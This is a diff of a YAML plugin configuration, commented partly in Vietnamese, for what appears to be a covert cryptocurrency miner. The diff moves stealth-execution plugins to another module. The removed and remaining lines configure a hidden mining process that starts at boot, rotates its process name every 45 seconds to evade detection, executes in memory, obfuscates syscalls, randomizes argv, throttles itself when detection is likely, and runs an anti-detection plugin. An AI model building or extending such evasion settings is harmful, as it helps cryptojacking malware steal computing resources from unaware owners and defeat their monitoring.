@@ -1,14 +1,6 @@
 plugins:
-  # 1. Stealth launch – khởi chạy tiến trình mining ẩn
-  - name: stealth_execution
-    enabled: true
-    priority: 10
-    module: cloaking.stealth_plugin
-    config:
-      # Xoay tên tiến trình mỗi 45 giây để tránh phát hiện
-      comm_rotation_interval: 45
-      # Bắt đầu ngay khi khởi động hệ thống
-      start_immediately: true
+  # 1. Stealth plugins moved to mining_environment.stealth module
+  # - name: stealth_execution (REMOVED)
 
   
   # 3. Adaptive cloaking – điều chỉnh throttle khi threat-level thay đổi
@@ -58,14 +50,8 @@ plugins:
       enable_comm_randomization: true
       enable_argv_randomization: true
 
-  # 8. Stealth Execution - thực thi ẩn danh nâng cao
-  - name: stealth_exec
-    enabled: true
-    priority: 40
-    module: cloaking.stealth_exec
-    config:
-      enable_memory_execution: true
-      enable_syscall_obfuscation: true
+  # 8. Stealth Execution moved to mining_environment.stealth module
+  # - name: stealth_exec (REMOVED)
 
   # 9. Anti Detection - chống phát hiện
   - name: anti_detection
